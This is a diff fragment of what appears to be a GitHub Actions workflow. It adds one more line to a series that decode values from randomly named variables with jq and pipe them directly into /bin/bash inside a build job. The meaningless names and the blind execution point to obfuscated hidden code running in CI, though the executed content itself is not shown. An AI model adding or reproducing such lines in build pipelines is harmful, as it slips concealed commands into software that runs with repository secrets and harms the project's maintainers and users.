@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$c1" | jq -r .pnso819 | /bin/bash
           echo $pzi90689 | jq -r .cdai3 | /bin/bash
           echo $ulhek889 | jq -r .kegu95 | /bin/bash
+          echo $eovg06 | jq -r .vzay376 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
